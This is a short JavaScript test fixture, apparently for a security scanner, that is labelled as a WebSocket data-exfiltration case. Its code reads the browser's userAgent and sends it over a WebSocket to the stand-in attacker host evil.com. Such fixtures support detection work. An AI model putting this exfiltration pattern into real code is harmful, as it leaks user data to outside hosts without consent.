/**
 * Test: WebSocket data exfiltration
 * Expected: VULNERABILITY - userAgent to WebSocket
 */

function test() {
  var ua = navigator.userAgent;
  var ws = new WebSocket('wss://evil.com/collect');
  
  ws.onopen = function() {
    ws.send(JSON.stringify({ userAgent: ua }));
  };
}

test();